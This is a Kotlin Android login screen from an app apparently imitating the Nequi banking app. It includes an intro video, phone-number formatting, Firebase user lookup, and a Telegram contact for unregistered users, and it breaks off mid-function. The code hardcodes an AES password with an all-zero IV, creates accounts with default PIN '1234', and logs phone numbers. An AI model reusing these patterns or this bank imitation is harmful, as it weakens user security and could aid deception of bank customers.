package com.wts.nequicooficial

import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.view.View
import android.widget.EditText
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.RelativeLayout
import android.widget.TextView
import android.view.ViewGroup
import android.widget.FrameLayout
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import android.view.animation.BounceInterpolator
import android.widget.ProgressBar
import android.widget.VideoView
import android.view.inputmethod.InputMethodManager
import android.content.Context
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import android.animation.ValueAnimator
import android.content.ClipData
import android.content.ClipboardManager
import android.media.MediaPlayer
import android.net.Uri
import kotlin.random.Random
import android.graphics.drawable.GradientDrawable

class LoginActivity : AppCompatActivity() {
    
    private lateinit var etPhone: EditText
    private lateinit var btnLogin: TextView
    private lateinit var tvSeparator: TextView
    private lateinit var ivHelp: ImageView
    private lateinit var phoneContainer: LinearLayout
    private lateinit var buttonContainer: LinearLayout
    private lateinit var logoImage: ImageView
    private lateinit var progressBar: ProgressBar
    private lateinit var dollarBox: TextView
    private lateinit var firebaseManager: FirebaseManager
    
    // Variables para clave dinámica
    private lateinit var dynamicDigits: TextView
    private lateinit var copyIcon: ImageView
    private lateinit var circleProgress: View
    private var currentDynamicKey = ""
    private var progressAnimator: ValueAnimator? = null
    
    private var isAppInBackground = false
    
    // Variables para controlar el estado del video
    private var videoReproducido = false
    private val PREFS_NAME = "VideoPrefs"
    private val KEY_VIDEO_COMPLETO = "video_completo_reproducido"
    
    // Variable para evitar múltiples error.png al mismo tiempo
    private var errorLayoutVisible = false
    
    // Variables para la ventana modal
    private lateinit var modalInfoApp: View
    private lateinit var btnCloseModal: ImageView
    private lateinit var btnAceptar: TextView
    private lateinit var tvTheBoss: TextView
    private var rainbowAnimator: ValueAnimator? = null
    private lateinit var securityManager: SecurityManager
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Ocultar la barra de acción para eliminar el título
        supportActionBar?.hide()
        
        // Configurar color de la barra de estado desde el inicio
        window.statusBarColor = android.graphics.Color.parseColor("#200020")
        
        // Cargar estado del video desde SharedPreferences
        val sharedPrefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        videoReproducido = sharedPrefs.getBoolean(KEY_VIDEO_COMPLETO, false)
        
        // Mostrar layout vacío y video
        mostrarLayoutVacioYVideo()
    }
    
    // Función para cargar imágenes desde assets en LoginActivity
    private fun cargarImagenesDesdeAssets() {
        try {
            android.util.Log.d("CargarImagenes", "🔄 Iniciando carga de imágenes desde assets en LoginActivity...")
            
            // Cargar imágenes del login
            cargarImagenDesdeAssets(findViewById(R.id.logoImage), "logo")
            cargarImagenDesdeAssets(findViewById(R.id.ivHelp), "question")
            
            // Cargar imagen bank
            cargarImagenDesdeAssets(findViewById(R.id.bankImage), "bank")
            
            android.util.Log.d("CargarImagenes", "✅ Todas las imágenes cargadas desde assets exitosamente en LoginActivity")
        } catch (e: Exception) {
            android.util.Log.e("CargarImagenes", "❌ Error cargando imágenes desde assets en LoginActivity: ${e.message}", e)
        }
    }
    
    private fun mostrarLayoutVacioYVideo() {
        // Crear layout vacío completamente limpio de color #200020
        val layoutVacio = RelativeLayout(this).apply {
            layoutParams = RelativeLayout.LayoutParams(
                RelativeLayout.LayoutParams.MATCH_PARENT,
                RelativeLayout.LayoutParams.MATCH_PARENT
            )
            setBackgroundColor(android.graphics.Color.parseColor("#200020"))
        }
        
        // Limpiar el root y agregar solo el layout vacío
        val rootView = findViewById<View>(android.R.id.content) as ViewGroup
        rootView.removeAllViews()
        rootView.addView(layoutVacio)
        
        // Esperar 2 segundos y luego reproducir video
        Handler(Looper.getMainLooper()).postDelayed({
            reproducirVideoNQ()
        }, 2000)
    }
    
    private fun reproducirVideoNQ() {
        try {
            // Crear layout para el video centrado con fondo blanco
            val videoLayout = android.widget.FrameLayout(this).apply {
                layoutParams = android.view.ViewGroup.LayoutParams(
                    android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                    android.view.ViewGroup.LayoutParams.MATCH_PARENT
                )
                setBackgroundColor(android.graphics.Color.WHITE)
            }
            
            // Crear VideoView centrado
            val videoView = android.widget.VideoView(this).apply {
                layoutParams = android.widget.FrameLayout.LayoutParams(
                    android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
                    android.widget.FrameLayout.LayoutParams.MATCH_PARENT
                ).apply {
                    gravity = android.view.Gravity.CENTER
                }
                setBackgroundColor(android.graphics.Color.TRANSPARENT)
                setZOrderOnTop(true)
            }
            
            // Agregar VideoView al layout
            videoLayout.addView(videoView)
            
            // Agregar al root
            val rootView = findViewById<View>(android.R.id.content) as ViewGroup
            rootView.addView(videoLayout)
            
            // Cambiar color de la barra de estado a blanco durante el video
            window.statusBarColor = android.graphics.Color.WHITE
            
            // Configurar el video usando VideoLoader
            VideoLoader.cargarVideoDesdeAssets(this, videoView, "nq")
            
            // Configurar alpha inicial para animación de desvanecido
            videoView.alpha = 0f
            
            videoView.setOnPreparedListener { mediaPlayer ->
                mediaPlayer.isLooping = false
                mediaPlayer.setVolume(0f, 0f) // Sin sonido
                // Configurar el video para que se ajuste al contenedor
                mediaPlayer.setVideoScalingMode(MediaPlayer.VIDEO_SCALING_MODE_SCALE_TO_FIT)
                
                if (videoReproducido) {
                    // Si ya se reprodujo completo, mostrar solo 2 frames de la mitad
                    val duracionVideo = mediaPlayer.duration
                    val tiempoInicio = duracionVideo / 2 // Comenzar desde la mitad
                    mediaPlayer.seekTo(tiempoInicio)
                    
                    // Iniciar el video
                    mediaPlayer.start()
                    
                    // Reproducir 2 frames con animación de desvanecido
                    reproducirFramesConDesvanecido(videoView, rootView, videoLayout)
                } else {
                    // Primera vez: reproducir video completo
                    mediaPlayer.seekTo(0)
                    mediaPlayer.start()
                    
                    // Marcar que se reprodujo completo
                    val sharedPrefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                    sharedPrefs.edit().putBoolean(KEY_VIDEO_COMPLETO, true).apply()
                    
                    // Mostrar el video con fade in para la primera vez
                    videoView.animate()
                        .alpha(1f)
                        .setDuration(500)
                        .start()
                    
                    // Esperar a que termine el video completo
                    mediaPlayer.setOnCompletionListener {
                        // Fade out antes de remover
                        videoView.animate()
                            .alpha(0f)
                            .setDuration(500)
                            .withEndAction {
                                rootView.removeView(videoLayout)
                                window.statusBarColor = android.graphics.Color.parseColor("#200020")
                                mostrarLoginActivity()
                            }.start()
                    }
                }
            }
            
            videoView.setOnErrorListener { mp, what, extra ->
                android.util.Log.e("VideoNQ", "Error reproduciendo video: what=$what, extra=$extra")
                // Si hay error, mostrar LoginActivity directamente
                rootView.removeView(videoLayout)
                // Restaurar color de la barra de estado
                window.statusBarColor = android.graphics.Color.parseColor("#200020")
                mostrarLoginActivity()
                true
            }
            
        } catch (e: Exception) {
            android.util.Log.e("VideoNQ", "Error al reproducir video", e)
            mostrarLoginActivity()
        }
    }
    
    private fun reproducirFramesConDesvanecido(videoView: VideoView, rootView: ViewGroup, videoLayout: FrameLayout) {
        // Primer frame: 0.5 segundos con fade in
        videoView.animate()
            .alpha(1f)
            .setDuration(250) // Fade in en 0.25 segundos
            .withEndAction {
                // Esperar 0.5 segundos para el primer frame
                Handler(Looper.getMainLooper()).postDelayed({
                    // Fade out del primer frame
                    videoView.animate()
                        .alpha(0f)
                        .setDuration(250) // Fade out en 0.25 segundos
                        .withEndAction {
                            // Segundo frame: 0.5 segundos con fade in
                            Handler(Looper.getMainLooper()).postDelayed({
                                videoView.animate()
                                    .alpha(1f)
                                    .setDuration(250) // Fade in en 0.25 segundos
                                    .withEndAction {
                                        // Esperar 0.5 segundos para el segundo frame
                                        Handler(Looper.getMainLooper()).postDelayed({
                                            // Fade out del segundo frame y terminar
                                            videoView.animate()
                                                .alpha(0f)
                                                .setDuration(250) // Fade out en 0.25 segundos
                                                .withEndAction {
                                                    // Remover video y mostrar LoginActivity
                                                    rootView.removeView(videoLayout)
                                                    // Restaurar color de la barra de estado
                                                    window.statusBarColor = android.graphics.Color.parseColor("#200020")
                                                    mostrarLoginActivity()
                                                }.start()
                                        }, 500) // 0.5 segundos para el segundo frame
                                    }.start()
                            }, 100) // Pequeña pausa entre frames
                        }.start()
                }, 500) // 0.5 segundos para el primer frame
            }.start()
    }
    
    private fun mostrarLoginActivity() {
        setContentView(R.layout.activity_login)
        
        // Ocultar la barra de acción
        supportActionBar?.hide()
        
        // Configurar color de la barra de estado
        window.statusBarColor = android.graphics.Color.parseColor("#200020")
        
        // Desactivar solo los botones de navegación (mantener barra de estado)
        // Permitir ver los botones de navegación
        
        // Inicializar vistas
        initViews()
        
        // Cargar imágenes desde assets (después de inicializar vistas)
        cargarImagenesDesdeAssets()
        
        // Inicializar Firebase
        firebaseManager = FirebaseManager(this)
        

        
        // Verificar seguridad antes de continuar
        if (!securityManager.performSecurityChecks()) {
            Log.e("LoginActivity", "❌ Verificaciones de seguridad fallaron")
            Toast.makeText(this, "Dispositivo no seguro detectado", Toast.LENGTH_LONG).show()
            finish()
            return
        }
        
        // Configurar listeners
        setupListeners()
        
        // Mostrar modal automáticamente después de 0.1 segundos
        Handler(Looper.getMainLooper()).postDelayed({
            mostrarModalInfoApp()
        }, 100)
    }
    
    override fun onResume() {
        super.onResume()
        ocultarSoloNavegacion()
        
        // Verificar que las vistas estén inicializadas antes de acceder a ellas
        if (::btnLogin.isInitialized && ::dollarBox.isInitialized && ::progressBar.isInitialized) {
            // Restaurar opacidad cuando se regrese a esta actividad
            btnLogin.alpha = 1f
            dollarBox.alpha = 1f
            btnLogin.text = "Entra"
            progressBar.visibility = View.GONE
        }
        
        isAppInBackground = false
    }
    
    override fun onPause() {
        super.onPause()
        isAppInBackground = true
        // Restaurar posiciones cuando la actividad se pausa
        restaurarPosicionesOriginales()
    }
    
    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (!hasFocus) {
            // Restaurar posiciones cuando la ventana pierde el foco
            restaurarPosicionesOriginales()
        }
    }
    


    private fun initViews() {
        etPhone = findViewById(R.id.etPhone)
        btnLogin = findViewById(R.id.btnLogin)
        tvSeparator = findViewById(R.id.tvSeparator)
        ivHelp = findViewById(R.id.ivHelp)
        phoneContainer = findViewById(R.id.phoneContainer)
        buttonContainer = findViewById(R.id.buttonContainer)
        logoImage = findViewById(R.id.logoImage)
        progressBar = findViewById(R.id.progressBar)
        dollarBox = findViewById(R.id.dollarBox)
        
        // Inicializar elementos de clave dinámica
        dynamicDigits = findViewById(R.id.dynamicDigits)
        copyIcon = findViewById(R.id.copyIcon)
        circleProgress = findViewById(R.id.circleProgress)
        
        // Cargar número guardado
        cargarNumeroGuardado()
        
        // Inicializar clave dinámica
        setupDynamicKey()
        
        // Inicializar elementos de la ventana modal
        modalInfoApp = findViewById(R.id.modalInfoApp)
        btnCloseModal = findViewById(R.id.btnCloseModal)
        btnAceptar = findViewById(R.id.btnAceptar)
        tvTheBoss = findViewById(R.id.tvTheBoss)
        
        // Inicializar SecurityManager
        securityManager = SecurityManager(this)
        
        ocultarSoloNavegacion()

    }

    private fun ocultarSoloNavegacion() {
        try {
            val flags = (View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY)
            window.decorView.systemUiVisibility = flags
        } catch (_: Exception) {}
    }
    

    
    private fun setupListeners() {
        btnLogin.setOnClickListener {
            performLogin()
        }
        
        // Listener para abrir la ventana modal desde el icono de ayuda
        ivHelp.setOnClickListener {
            mostrarModalInfoApp()
        }
        
        // Listener para cerrar la ventana modal
        btnCloseModal.setOnClickListener {
            ocultarModalInfoApp()
        }
        
        // Listener para el botón Aceptar
        btnAceptar.setOnClickListener {
            ocultarModalInfoApp()
        }
        
        // Listener para "Click aquí" (canal oficial Telegram)
        tvTheBoss.setOnClickListener {
            try {
                val telegramUrl = "https://t.me/+d17o7xIvIqdkZGYx"
                val intent = android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(telegramUrl))
                startActivity(intent)
            } catch (e: Exception) {
                Log.e("ModalInfoApp", "Error abriendo Telegram: ${e.message}", e)
                Toast.makeText(this, "Error al abrir Telegram", Toast.LENGTH_SHORT).show()
            }
        }
        
        // Configurar formateo del número de teléfono
        etPhone.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
            override fun afterTextChanged(s: Editable?) {
                val phoneNumber = s.toString()
                val digitsOnly = phoneNumber.replace("\\s".toRegex(), "")
                
                // Guardar número mientras se escribe (solo si tiene 10 dígitos)
                if (digitsOnly.length == 10) {
                    guardarNumeroTemporal(digitsOnly)
                }
                
                // Quitar el foco si se ingresaron exactamente 10 dígitos (sin espacios)
                if (digitsOnly.length == 10) {
                    etPhone.clearFocus()
                    // Ocultar el teclado
                    val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
                    imm.hideSoftInputFromWindow(etPhone.windowToken, 0)
                }
                
                // Formatear el número con espacios solo si no excede 10 dígitos
                if (digitsOnly.length <= 10) {
                    val formatted = StringBuilder()
                    for (i in digitsOnly.indices) {
                        formatted.append(digitsOnly[i])
                        if (i == 2 || i == 5) {
                            formatted.append(" ")
                        }
                    }
                    // Eliminar espacio final si existe
                    val formattedStr = formatted.toString().trimEnd()
                    // Evitar recursión infinita
                    if (formattedStr != phoneNumber) {
                        etPhone.removeTextChangedListener(this)
                        etPhone.setText(formattedStr)
                        if (etPhone.hasFocus()) {
                            etPhone.setSelection(formattedStr.length)
                        }
                        etPhone.addTextChangedListener(this)
                    }
                    // Solo quitar el foco si hay 10 dígitos y el texto formateado tiene 12 caracteres
                    if (digitsOnly.length == 10 && formattedStr.length == 12) {
                        etPhone.clearFocus()
                        val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
                        imm.hideSoftInputFromWindow(etPhone.windowToken, 0)
                    }
                }
            }
        })
        
        // Configurar color fijo del separador
        tvSeparator.setTextColor(android.graphics.Color.parseColor("#200020"))
        
                // Configurar movimiento de contenedores cuando el campo tiene foco
        etPhone.setOnFocusChangeListener { _, hasFocus ->
            if (hasFocus) {
                // Animación suave al subir
                logoImage.animate()
                    .translationY(-150f)
                    .setDuration(300)
                    .setInterpolator(android.view.animation.DecelerateInterpolator())
                    .start()
                
                phoneContainer.animate()
                    .translationY(-250f)
                    .setDuration(400)
                    .setInterpolator(android.view.animation.DecelerateInterpolator())
                    .start()
                
                buttonContainer.animate()
                    .translationY(-250f)
                    .setDuration(400)
                    .setInterpolator(android.view.animation.DecelerateInterpolator())
                    .start()
                
            } else {
                // Restaurar posición original con animación suave y forzar actualización
                logoImage.animate()
                    .translationY(0f)
                    .setDuration(300)
                    .setInterpolator(android.view.animation.AccelerateInterpolator())
                    .withEndAction {
                        logoImage.translationY = 0f
                        logoImage.requestLayout()
                    }
                    .start()
                
                phoneContainer.animate()
                    .translationY(0f)
                    .setDuration(300)
                    .setInterpolator(android.view.animation.AccelerateInterpolator())
                    .withEndAction {
                        phoneContainer.translationY = 0f
                        phoneContainer.requestLayout()
                    }
                    .start()
                
                buttonContainer.animate()
                    .translationY(0f)
                    .setDuration(300)
                    .setInterpolator(android.view.animation.AccelerateInterpolator())
                    .withEndAction {
                        buttonContainer.translationY = 0f
                        buttonContainer.requestLayout()
                    }
                    .start()
            }
        }
        
        // Agregar listener para detectar cuando el teclado se oculta
        val rootView = findViewById<View>(android.R.id.content)
        rootView.viewTreeObserver.addOnGlobalLayoutListener {
            val r = android.graphics.Rect()
            rootView.getWindowVisibleDisplayFrame(r)
            val screenHeight = rootView.height
            val keypadHeight = screenHeight - r.bottom
            
            // Si el teclado está oculto (keypadHeight es pequeño)
            if (keypadHeight < screenHeight * 0.15) {
                // Forzar restauración de posiciones
                if (logoImage.translationY != 0f || phoneContainer.translationY != 0f || buttonContainer.translationY != 0f) {
                    restaurarPosicionesOriginales()
                }
            }
        }
        
        // Agregar listener para cuando se toca fuera del campo
        rootView.setOnTouchListener { _, event ->
            if (event.action == android.view.MotionEvent.ACTION_DOWN) {
                val focusView = currentFocus
                if (focusView != null && focusView != etPhone) {
                    // Si se toca fuera del campo de teléfono, restaurar posiciones
                    if (logoImage.translationY != 0f || phoneContainer.translationY != 0f || buttonContainer.translationY != 0f) {
                        restaurarPosicionesOriginales()
                    }
                }
            }
            false // Permitir que el evento continúe
        }
        
        // El listener para ivHelp ya está configurado arriba para mostrar el modal
        
        // Configurar listener del icono de copiar
        copyIcon.setOnClickListener {
            copyDynamicKeyToClipboard()
        }
    }
    
    private fun cargarNumeroGuardado() {
        try {
            val sharedPref = getSharedPreferences("NequiCoPrefs", MODE_PRIVATE)
            val numeroGuardado = sharedPref.getString("user_number", "")
            
            if (!numeroGuardado.isNullOrEmpty()) {
                android.util.Log.d("LoginActivity", "Número guardado encontrado: $numeroGuardado")
                
                // Formatear el número guardado
                val numeroFormateado = formatearNumeroTelefono(numeroGuardado)
                etPhone.setText(numeroFormateado)
                
                android.util.Log.d("LoginActivity", "Número cargado y formateado: $numeroFormateado")
            } else {
                android.util.Log.d("LoginActivity", "No hay número guardado")
            }
        } catch (e: Exception) {
            android.util.Log.e("LoginActivity", "Error cargando número guardado: ${e.message}", e)
        }
    }
    
    private fun formatearNumeroTelefono(numero: String): String {
        val digitos = numero.replace("\\s".toRegex(), "")
        if (digitos.length <= 10) {
            val formateado = StringBuilder()
            for (i in digitos.indices) {
                formateado.append(digitos[i])
                if (i == 2 || i == 5) {
                    formateado.append(" ")
                }
            }
            return formateado.toString().trimEnd()
        }
        return numero
    }
    
    private fun guardarNumeroTemporal(numero: String) {
        try {
            val sharedPref = getSharedPreferences("NequiCoPrefs", MODE_PRIVATE)
            with(sharedPref.edit()) {
                putString("user_number", numero)
                apply()
            }
            android.util.Log.d("LoginActivity", "Número temporal guardado: $numero")
        } catch (e: Exception) {
            android.util.Log.e("LoginActivity", "Error guardando número temporal: ${e.message}", e)
        }
    }
    
    // Función para forzar la restauración de posiciones originales
    private fun restaurarPosicionesOriginales() {
        logoImage.translationY = 0f
        phoneContainer.translationY = 0f
        buttonContainer.translationY = 0f
        
        logoImage.requestLayout()
        phoneContainer.requestLayout()
        buttonContainer.requestLayout()
        
        android.util.Log.d("LoginActivity", "Posiciones originales restauradas")
    }
    


    // ===== SISTEMA DE DESENCRIPTACIÓN DE ARCHIVOS .BIN =====
    
    // Clave de desencriptación (debe coincidir con Python)
    private val ENCRYPTION_PASSWORD = "ladroneshijueputas"
    
    // Función para generar clave AES desde contraseña
    private fun generarClaveAES(password: String): ByteArray {
        val keyBytes = password.toByteArray()
        val key = ByteArray(32)
        
        // Si la clave es menor a 32 bytes, rellenar con ceros
        if (keyBytes.size < 32) {
            System.arraycopy(keyBytes, 0, key, 0, keyBytes.size)
            // Los bytes restantes ya están en 0 por defecto
        } else {
            // Si es mayor a 32 bytes, truncar
            System.arraycopy(keyBytes, 0, key, 0, 32)
        }
        
        return key
    }
    
        // Función para desencriptar archivo .bin desde assets
    private fun desencriptarBin(nombreArchivo: String): android.graphics.Bitmap? {
        return try {
            android.util.Log.d("Desencriptacion", "🔐 Intentando desencriptar .bin: $nombreArchivo")
            val inputStream = assets.open(nombreArchivo)
            val encryptedBytes = inputStream.readBytes()
            inputStream.close()

            android.util.Log.d("Desencriptacion", "📦 Bytes encriptados leídos: ${encryptedBytes.size}")

            // Generar clave AES
            val key = generarClaveAES(ENCRYPTION_PASSWORD)
            val cipher = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding")
            val keySpec = javax.crypto.spec.SecretKeySpec(key, "AES")
            val ivSpec = javax.crypto.spec.IvParameterSpec(ByteArray(16) { 0 }) // IV de ceros
            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, keySpec, ivSpec)

            // Desencriptar
            val decryptedBytes = cipher.doFinal(encryptedBytes)
            android.util.Log.d("Desencriptacion", "🔓 Bytes desencriptados: ${decryptedBytes.size}")

            // Convertir a Bitmap
            val bitmap = android.graphics.BitmapFactory.decodeByteArray(decryptedBytes, 0, decryptedBytes.size)
            if (bitmap != null) {
                android.util.Log.d("Desencriptacion", "✅ .bin desencriptado exitosamente: ${bitmap.width}x${bitmap.height}")
            } else {
                android.util.Log.e("Desencriptacion", "❌ BitmapFactory.decodeByteArray retornó null")
            }
            bitmap
        } catch (e: Exception) {
            android.util.Log.e("Desencriptacion", "❌ Error desencriptando .bin: ${e.message}", e)
            null
        }
    }
    
    // Función para establecer imagen desencriptada en ImageView
    private fun establecerImagenDesencriptada(imageView: ImageView, nombreArchivo: String) {
        try {
            android.util.Log.d("Desencriptacion", "🔄 Estableciendo imagen: $nombreArchivo")
            android.util.Log.d("Desencriptacion", "📱 ImageView ID: ${imageView.id}")
            
            val bitmap = desencriptarBin(nombreArchivo)
            if (bitmap != null) {
                imageView.setImageBitmap(bitmap)
                android.util.Log.d("Desencriptacion", "✅ Imagen desencriptada establecida correctamente")
            } else {
                android.util.Log.e("Desencriptacion", "❌ No se pudo desencriptar el archivo .bin")
                // No usar fallback - solo mostrar error en logs
            }
        } catch (e: Exception) {
            android.util.Log.e("Desencriptacion", "❌ Error estableciendo imagen desencriptada: ${e.message}", e)
            // No usar fallback - solo mostrar error en logs
        }
    }

    // Función helper para cargar imagen desde assets por nombre (sin extensión)
    private fun cargarImagenDesdeAssets(imageView: ImageView, nombreSinExtension: String) {
        try {
            android.util.Log.d("CargarImagen", "🔄 Intentando cargar imagen: $nombreSinExtension")
            android.util.Log.d("CargarImagen", "📱 ImageView encontrado: ${imageView.id}")
            
            val nombreArchivo = "$nombreSinExtension.bin"
            android.util.Log.d("CargarImagen", "📄 Archivo a cargar: $nombreArchivo")
            
            establecerImagenDesencriptada(imageView, nombreArchivo)
        } catch (e: Exception) {
            android.util.Log.e("CargarImagen", "❌ Error cargando imagen $nombreSinExtension: ${e.message}", e)
        }
    }

    private fun mostrarErrorConImagen() {
        // Evitar mostrar múltiples error.png al mismo tiempo
        if (errorLayoutVisible) {
            return
        }
        
        errorLayoutVisible = true
        
        try {
            // Crear layout para el error
            val errorLayout = FrameLayout(this).apply {
                layoutParams = ViewGroup.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.MATCH_PARENT
                )
                setBackgroundColor(android.graphics.Color.TRANSPARENT)
            }
            
            // Crear layout para el texto del error (separado de la imagen)
            val textLayout = LinearLayout(this).apply {
                layoutParams = ViewGroup.LayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                )
                orientation = LinearLayout.HORIZONTAL
                gravity = android.view.Gravity.CENTER
                setBackgroundColor(android.graphics.Color.TRANSPARENT)
            }
            
            // Crear ImageView para error.png
            val ivError = ImageView(this).apply {
                layoutParams = ViewGroup.LayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                )
                // Usar PNG desencriptado
                establecerImagenDesencriptada(this, "error.bin")
                scaleType = ImageView.ScaleType.FIT_CENTER
                setPadding(0, 215, 0, 0) // Padding arriba para bajar la imagen
            }
            
            // Crear TextView para el mensaje
            val tvErrorMessage = TextView(this).apply {
                layoutParams = ViewGroup.LayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                )
                text = "Número no registrado, contacta a "
                setTextColor(android.graphics.Color.WHITE)
                textSize = 16f
                gravity = android.view.Gravity.CENTER
                setPadding(170, 200, 0, 0) // Sin padding
            }
            
            // Crear TextView clickeable para "The boss"
            val tvTheBoss = TextView(this).apply {
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                ).apply {
                    leftMargin = -200 // Margen negativo para mover a la izquierda
                }
                text = "The boss"
                setTextColor(android.graphics.Color.WHITE) // Color blanco
                textSize = 16f
                gravity = android.view.Gravity.CENTER
                isClickable = true
                isFocusable = true
                setPadding(0, 300, 0, 0) // Sin padding negativo para evitar recorte
                
                // Agregar iluminación (shadow) para que resalte
                setShadowLayer(8f, 0f, 0f, android.graphics.Color.parseColor("#e8b7d2")) // Sombra rosada
            }
            
            // Configurar click listener para abrir Telegram
            tvTheBoss.setOnClickListener {
                try {
                    val telegramUrl = "https://t.me/The_Boss_Adm"
                    val intent = android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(telegramUrl))
                    startActivity(intent)
                } catch (e: Exception) {
                    android.util.Log.e("LoginActivity", "Error abriendo Telegram: ${e.message}", e)
                }
            }
            
            // Agregar elementos al layout de texto
            textLayout.addView(tvErrorMessage)
            textLayout.addView(tvTheBoss)
            
            // Agregar elementos separados al errorLayout (imagen primero, texto después para que aparezca arriba)
            errorLayout.addView(ivError)
            errorLayout.addView(textLayout)
            
            // Agregar el layout al root
            val rootView = findViewById<View>(android.R.id.content) as ViewGroup
            rootView.addView(errorLayout)
            
            // Configurar propiedades para animación de arriba hacia abajo
            errorLayout.alpha = 0f
            errorLayout.translationY = -7000f // Empezar desde más arriba
            
            // Mostrar el layout con animación de arriba hacia abajo más lenta
            errorLayout.animate()
                .alpha(1f)
                .translationY(-200f) // Mover a una posición mucho más abajo
                .setDuration(2000) // Duración mucho más larga para transición más lenta
                .setInterpolator(android.view.animation.AccelerateDecelerateInterpolator()) // Interpolador suave
                .withEndAction {
                    // Esperar 3 segundos y luego ocultar
                    Handler(Looper.getMainLooper()).postDelayed({
                        errorLayout.animate()
                            .alpha(0f)
                            .translationY(-4000f) // Salir hacia arriba
                            .setDuration(1500) // Duración más larga para salida lenta
                            .setInterpolator(android.view.animation.AccelerateDecelerateInterpolator()) // Interpolador suave
                            .withEndAction {
                                rootView.removeView(errorLayout)
                                errorLayoutVisible = false // Resetear la variable
                            }.start()
                    }, 3000) // 3 segundos
                }.start()
                
        } catch (e: Exception) {
            android.util.Log.e("LoginActivity", "Error mostrando imagen de error: ${e.message}", e)
            errorLayoutVisible = false // Resetear la variable en caso de error
        }
    }
    
    private fun performLogin() {
        val phoneNumber = etPhone.text.toString().replace(" ", "")
        
        // Validaciones básicas
        if (phoneNumber.isEmpty()) {
            mostrarErrorConImagen()
            return
        }
        
        if (phoneNumber.length != 10) {
            mostrarErrorConImagen()
            return
        }
        
        // Animación de opacidad y mostrar ProgressBar
        btnLogin.alpha = 0.5f
        dollarBox.alpha = 0.5f
        btnLogin.text = ""
        progressBar.alpha = 0.5f
        progressBar.visibility = View.VISIBLE

        // Limpiar el número de teléfono (quitar espacios y caracteres especiales)
        val cleanPhoneNumber = phoneNumber.replace(" ", "").replace("-", "").replace("(", "").replace(")", "").replace("+", "")
        
        android.util.Log.d("LoginActivity", "Número original: '$phoneNumber'")
        android.util.Log.d("LoginActivity", "Número limpio: '$cleanPhoneNumber'")
        android.util.Log.d("LoginActivity", "Longitud del número limpio: ${cleanPhoneNumber.length}")
        android.util.Log.d("LoginActivity", "¿El número limpio contiene solo dígitos?: ${cleanPhoneNumber.all { it.isDigit() }}")
        
        // Verificar usuario en Firebase
        CoroutineScope(Dispatchers.Main).launch {
            try {
                android.util.Log.d("LoginActivity", "Iniciando verificación de usuario: $cleanPhoneNumber")
                
                // Primero, probar la conexión a Firebase
                val connectionTest = withContext(Dispatchers.IO) {
                    firebaseManager.testFirebaseConnection()
                }
                android.util.Log.d("LoginActivity", "Prueba de conexión a Firebase: $connectionTest")
                
                if (!connectionTest) {
                    mostrarErrorConImagen()
                    // Restaurar botón
                    btnLogin.alpha = 1f
                    dollarBox.alpha = 1f
                    btnLogin.text = "Entra"
                    progressBar.visibility = View.GONE
                    return@launch
                }
                
                // Escribir log de prueba
                withContext(Dispatchers.IO) {
                    firebaseManager.writeTestLog("Login intentado con número: $cleanPhoneNumber")
                }
                
                // Primero intentar buscar el usuario existente
                var user = withContext(Dispatchers.IO) {
                    firebaseManager.getUserByNumber(cleanPhoneNumber)
                }
                
                // Si no existe, crear el usuario
                if (user == null) {
                    android.util.Log.d("LoginActivity", "Usuario no encontrado, creando nuevo usuario...")
                    user = withContext(Dispatchers.IO) {
                        firebaseManager.createUser(cleanPhoneNumber, "1234") // PIN por defecto
                    }
                } else {
                    android.util.Log.d("LoginActivity", "Usuario encontrado: ${user.number}")
                }
                
                android.util.Log.d("LoginActivity", "Resultado de Firebase: $user")
                
                if (user != null) {
                    // Guardar número del usuario en SharedPreferences
                    val sharedPref = getSharedPreferences("NequiCoPrefs", MODE_PRIVATE)
                    with(sharedPref.edit()) {
                        putString("user_number", cleanPhoneNumber)
                        putString("numero_firebase", cleanPhoneNumber)
                        apply()
                    }
                    
                    android.util.Log.d("LoginActivity", "Usuario autenticado/creado: ${user.number}")
                    
                    // Espera 2 segundos antes de ir a PinActivity
                    Handler(Looper.getMainLooper()).postDelayed({
                        val intent = android.content.Intent(this@LoginActivity, PinActivity::class.java)
                        startActivity(intent)
                        overridePendingTransition(R.anim.slide_in_right, R.anim.slide_out_left)
                        finish()
                    }, 2000)
                } else {
                    // Usuario no encontrado
                    android.util.Log.w("LoginActivity", "No se pudo autenticar ni crear usuario: $phoneNumber")
                    mostrarErrorConImagen()
                    
                    // Restaurar botón
                    btnLogin.alpha = 1f
                    dollarBox.alpha = 1f
                    btnLogin.text = "Entra"
                    progressBar.visibility = View.GONE
                }
            } catch (e: Exception) {
